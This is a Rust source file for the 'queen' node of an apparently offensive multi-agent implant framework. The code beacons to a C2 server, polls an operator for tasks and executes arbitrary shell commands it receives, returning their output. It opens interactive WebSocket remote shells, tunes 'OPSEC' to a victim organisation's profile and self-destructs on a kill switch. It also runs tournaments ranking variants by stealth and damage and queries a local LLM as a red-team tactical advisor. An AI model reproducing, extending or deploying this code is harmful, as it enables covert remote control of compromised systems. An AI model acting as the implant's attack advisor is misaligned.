use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

use hive_base::phoenix::AgentBlueprint;
use hive_base::phoenix::Phoenix;

// smoke_signals only needed for OrgCloudProfile (OPSEC calibration)
use hive_base::smoke_signals::learn_org_profile;

#[derive(Debug, Serialize, Deserialize)]
struct LLMResponse {
    accion: String,
    confianza: f32,
}

#[derive(Debug, Serialize)]
struct OllamaRequest {
    model: String,
    prompt: String,
    stream: bool,
}

#[derive(Debug, Deserialize)]
struct OllamaResponse {
    response: String,
}

struct OvermindAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    ollama_url: String,
    model: String,
    heartbeat_interval: Duration,
    tournament: hive_base::tournament::Tournament,
    hivemind: hive_base::hivemind::HiveMind,
    whispernet: hive_base::whispernet::WhisperNet,
    last_tournament_gen: usize,
    interactive_shell: Option<hive_base::remote_shell::WsShell>,
}

impl OvermindAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        // TaskPoller (ronda 4): ciclo operador → agente → resultado (HIVE_C2_URL).
        let _ = hive_base::task_poller::spawn_from_env(identity.id(), "queen");
        let comms = HiveChamber::connect(&identity, Role::Queen)
            .await
            .expect("Failed to connect to colmena arena");

        info!("Queen connected to shared-memory arena");

        let whispernet =
            hive_base::whispernet::WhisperNet::new(hive_base::whispernet::WhisperConfig {
                node_id: identity.id(),
                listen_port: 0,
                max_peers: 16,
                max_hops: 5,
                heartbeat_interval_secs: 60,
                encryption_enabled: true,
            });

        let agent = Self {
            comms,
            identity,
            consensus: ConsensusEngine::new(0.66),
            ollama_url: "http://localhost:11434".to_string(),
            model: "tinyllama".to_string(),
            heartbeat_interval: Duration::from_secs(10),
            tournament: hive_base::tournament::Tournament::new(),
            hivemind: hive_base::hivemind::HiveMind::new(),
            whispernet,
            last_tournament_gen: 0,
            interactive_shell: None,
        };

        // OPSEC: calibrate from victim org profile at startup
        let profile = learn_org_profile();
        agent.comms.calibrate_opsec(&profile);
        info!("OPSEC: calibrated from org profile");

        agent
    }

    fn build_prompt(&self, dilemma: &str, context: &str) -> String {
        format!(
            "[INST] <<SYS>>\nEres un asesor tactico de red team.\nResponde solo con JSON: {{\"accion\": \"...\", \"confianza\": 0.0-1.0}}\n<</SYS>>\nContexto: {}\nPregunta: {} [/INST]",
            context, dilemma
        )
    }

    async fn query_llm(&self, prompt: String) -> Option<LLMResponse> {
        let client = reqwest::Client::new();
        let request = OllamaRequest {
            model: self.model.clone(),
            prompt,
            stream: false,
        };

        match client
            .post(format!("{}/api/generate", self.ollama_url))
            .json(&request)
            .send()
            .await
        {
            Ok(resp) => match resp.json::<OllamaResponse>().await {
                Ok(r) => {
                    info!("LLM: {}", r.response);
                    serde_json::from_str(&r.response).ok()
                }
                Err(e) => {
                    warn!("Parse error: {}", e);
                    None
                }
            },
            Err(e) => {
                warn!("Ollama unavailable at {}: {}", self.ollama_url, e);
                None
            }
        }
    }

    async fn publish_msg(&self, msg: Message) {
        self.comms.publish(msg).await;
    }

    async fn send_heartbeat(&self) {
        self.comms.send_heartbeat().await;
    }

    async fn process_incoming(&mut self) {
        let messages = self.comms.read_new().await;

        for msg in messages {
            self.consensus.process_message(&msg);
            if msg.is_kill_switch() {
                warn!("Kill switch received - agent self-destructing now");
                std::process::exit(0);
            }
            match &msg.payload {
                Payload::Query {
                    dilemma,
                    context,
                    query_id,
                } => {
                    info!("Query from {}: {}", msg.agent_role, dilemma);
                    let prompt = self.build_prompt(dilemma, context);

                    let answer = if let Some(resp) = self.query_llm(prompt).await {
                        info!("LLM: {} (conf: {})", resp.accion, resp.confianza);
                        resp.accion
                    } else {
                        warn!("LLM unavailable, defaulting to wait");
                        "wait".to_string()
                    };

                    let resp_msg = Message {
                        agent_id: self.identity.id(),
                        agent_role: Role::Queen,
                        timestamp: hive_base::utils::timestamp_now(),
                        payload: Payload::Response {
                            query_id: *query_id,
                            answer,
                            confidence: 0.5,
                        },
                    };
                    self.publish_msg(resp_msg).await;
                }
                Payload::Belief {
                    asset,
                    value: _value,
                    confidence: _confidence,
                } if asset.starts_with("hivemind:") => {
                    info!("HiveMind: received proposal belief: {}", asset);
                }
                Payload::Proposal {
                    action,
                    argument,
                    proposal_id,
                } => {
                    let mut params = HashMap::new();
                    params.insert("action".into(), action.clone());
                    params.insert("argument".into(), argument.clone());
                    self.hivemind
                        .propose_from_operator(self.identity.id(), action.clone(), params);
                    info!(
                        "HiveMind: registered proposal {} from {}",
                        proposal_id, msg.agent_role
                    );
                }
                Payload::Vote { .. } => {
                    // Ronda 11: la reina PROCESA los votos — antes ningún
                    // binario los consumía y el tally solo usaba la
                    // reputación propia, así que ninguna directiva podía
                    // aprobarse jamás en runtime. El tally pondera con las
                    // reputaciones reales de los agentes activos (default
                    // 1.0 del engine para los aún sin ajustar).
                    let mut rep = HashMap::new();
                    for (id, _, _) in self.comms.get_active_agents(30).await {
                        rep.insert(id, self.consensus.get_reputation(&id));
                    }
                    match self.hivemind.process_arena_message(&msg, &rep) {
                        Some((did, action, "approved")) => {
                            info!(
                                "HiveMind: directive {} '{}' APPROVED — broadcasting",
                                did, action
                            );
                            // Broadcast de la aprobación: StatusEvent
                            // (hive_directive_approved) + belief directive:<id>
                            // — observables por el TUI y por toda la colonia.
                            let executed = self.hivemind.execute_approved();
                            for eid in executed {
                                if let Some(d) = self
                                    .hivemind
                                    .directives
                                    .iter()
                                    .find(|d| d.directive_id == eid)
                                {
                                    let st =
                                        self.hivemind.to_directive_message(d, self.identity.id());
                                    self.publish_msg(st).await;
                                    let belief = self.hivemind.to_belief(d, self.identity.id());
                                    self.publish_msg(belief).await;
                                }
                            }
                        }
                        Some((did, action, kind)) => {
                            info!(
                                "HiveMind: directive {} '{}' ({}) — voto de {}",
                                did, action, kind, msg.agent_role
                            );
                        }
                        None => {}
                    }
                }
                Payload::Request { service, payload } if service == "exec" => {
                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
                        let cmd = cmd_data["cmd"].as_str().unwrap_or("id").to_string();
                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
                        info!("EXEC: executing cmd_id={}: {}", cmd_id, cmd);
                        let result = hive_base::remote_shell::execute_command(&cmd);
                        let result_msg = Message::belief(
                            self.identity.id(),
                            Role::Queen,
                            format!("exec:result:{}", cmd_id),
                            hive_base::Value::String(format!(
                                "exit={} duration={}ms stdout={} stderr={}",
                                result.exit_code,
                                result.duration_ms,
                                result.stdout.trim().chars().take(500).collect::<String>(),
                                result.stderr.trim().chars().take(200).collect::<String>(),
                            )),
                            if result.exit_code == 0 { 1.0 } else { 0.5 },
                        );
                        self.publish_msg(result_msg).await;
                    }
                }
                Payload::Request { service, payload } if service == "shell" => {
                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
                        let ws_url = cmd_data["url"]
                            .as_str()
                            .unwrap_or("ws://127.0.0.1:9000/shell");
                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
                        info!("SHELL: starting interactive shell -> {}", ws_url);
                        let shell = hive_base::remote_shell::WsShell::start(ws_url);
                        let prev = self.interactive_shell.replace(shell);
                        if let Some(mut old) = prev {
                            old.stop();
                        }
                        let result_msg = Message::belief(
                            self.identity.id(),
                            Role::Queen,
                            format!("shell:result:{}", cmd_id),
                            hive_base::Value::String("started".into()),
                            1.0,
                        );
                        self.publish_msg(result_msg).await;
                    }
                }
                Payload::Request { service, .. } if service == "shell_stop" => {
                    info!("SHELL: stopping interactive shell");
                    if let Some(mut shell) = self.interactive_shell.take() {
                        shell.stop();
                    }
                }
                _ => {}
            }
        }

        if self.hivemind.enabled {
            let mut rep_map = HashMap::new();
            rep_map.insert(self.identity.id(), 1.0);
            let pending_ids: Vec<Uuid> = self
                .hivemind
                .get_pending_directives()
                .iter()
                .map(|d| d.directive_id)
                .collect();
            for did in pending_ids {
                self.hivemind.tally_votes(did, &rep_map);
            }
            for executed_id in self.hivemind.execute_approved() {
                info!("HiveMind: directive {} approved and executed", executed_id);
                let Some(directive) = self
                    .hivemind
                    .directives
                    .iter()
                    .find(|d| d.directive_id == executed_id)
                else {
                    warn!(
                        "HiveMind: directive {} no longer present, skipping",
                        executed_id
                    );
                    continue;
                };
                let msg = self.hivemind.to_belief(directive, self.identity.id());
                self.publish_msg(msg).await;

                let whisper_payload = serde_json::to_vec(&directive).unwrap_or_default();
                let whisper_msg = hive_base::whispernet::WhisperMessage {
                    msg_id: Uuid::new_v4(),
                    sender_id: self.identity.id(),
                    seq: 0,
                    payload: whisper_payload,
                    ttl: self.whispernet.config().max_hops,
                    signature: vec![],
                    timestamp: hive_base::utils::timestamp_now(),
                };
                if self.whispernet.send_message(whisper_msg).await.is_ok() {
                    info!("WhisperNet: broadcast directive {}", executed_id);
                }
            }
        }
    }

    async fn run_tournament(&mut self) {
        let config = hive_base::tournament::TournamentConfig {
            target: format!("tournament-gen-{}", self.last_tournament_gen),
            competitors: 3,
            criteria: vec![
                hive_base::tournament::WinCriteria::Speed,
                hive_base::tournament::WinCriteria::Stealth,
                hive_base::tournament::WinCriteria::Damage,
            ],
            timeout_secs: 300,
            generations: 2,
        };

        info!(
            "Queen: starting darwinian tournament gen {}",
            self.last_tournament_gen
        );
        let result = self.tournament.run_tournament(&config);

        if result.winner_id != Uuid::nil() {
            info!("Queen: tournament winner {}", result.winner_id);
            let msg = Message::belief(
                self.identity.id(),
                Role::Queen,
                "tournament_winner".into(),
                hive_base::Value::String(format!("{}", result.winner_id)),
                1.0,
            );
            self.publish_msg(msg).await;
        }

        self.last_tournament_gen += 1;
    }

    async fn run(&mut self) {
        info!("Hive Queen starting | ID: {}", self.identity.id());
        info!("Ollama: {} | Model: {}", self.ollama_url, self.model);
        // Ronda 11: HiveMind activo DESDE EL ARRANQUE — antes se activaba en
        // el primer tick de 120 s y las propuestas/votos previos se
        // ignoraban (los agentes pueden proponer en los primeros segundos).
        self.hivemind.enabled = true;
        info!("HiveMind: activated");
        let msg = Message::belief(
            self.identity.id(),
            Role::Queen,
            "hivemind_active".into(),
            hive_base::Value::Bool(true),
            1.0,
        );
        self.publish_msg(msg).await;
        self.send_heartbeat().await;

        let mut heartbeat_timer = time::interval(self.heartbeat_interval);
        let mut tournament_timer = time::interval(Duration::from_secs(600));
        let mut whisper_timer = time::interval(Duration::from_secs(60));

        let mut phoenix_timer = time::interval(Duration::from_secs(300));
        let mut c2_beacon_timer = time::interval(Duration::from_secs(1800));

        loop {
            tokio::select! {
                _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
                _ = tournament_timer.tick() => { self.run_tournament().await; }
                _ = whisper_timer.tick() => {
                    self.whispernet.rebuild_routing_table();
                    info!("WhisperNet: {} peers, {} msgs routed",
                        self.whispernet.peers().len(), self.whispernet.messages().len());
                }
                _ = phoenix_timer.tick() => {
                    // Ronda 6: snapshot del genoma SOLO en memoria (sin hide,
                    // sin persistencia, sin escrituras).
                    let blueprint = AgentBlueprint {
                        role: "queen".into(),
                        binary_hash: format!("{}", self.identity.id()),
                        binary_size: 0,
                        policy: {
                            let mut p = HashMap::new();
                            p.insert("model".into(), self.model.clone());
                            p.insert("heartbeat_interval".into(), format!("{}", self.heartbeat_interval.as_secs()));
                            p
                        },
                        encrypted_chunk: vec![],
                    };
                    let genome = Phoenix::generate_genome(vec![blueprint]);
                    let fragments = Phoenix::fragment_genome(&genome, 4);
                    info!(
                        "Phoenix: genoma {} fragmentado en {} fragmentos (en memoria)",
                        genome.genome_id,
                        fragments.len()
                    );
                }
                // ── C2 beacon via multi-channel failover director ─────────
                _ = c2_beacon_timer.tick() => {
                    let mut args = HashMap::new();
                    args.insert("peer_count".into(), format!("{}", self.whispernet.peers().len()));
                    args.insert("directive_count".into(), format!("{}", self.hivemind.directives.len()));
                    args.insert("agent_id".into(), format!("{}", self.identity.id()));
                    let c2msg = hive_base::smoke_signals::C2Message::new("colony_heartbeat".into(), args);
                    let payload = c2msg.to_beacon_payload();
                    let sent = self.comms.send_beacon_c2(&payload).await;
                    if sent {
                        info!("C2: colony heartbeat delivered via failover director");
                    } else {
                        warn!("C2: colony heartbeat failed on all channels");
                    }
                }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("queen");
    info!("Initializing Hive Queen...");
    let mut overmind = OvermindAgent::new().await;
    overmind.run().await;
}
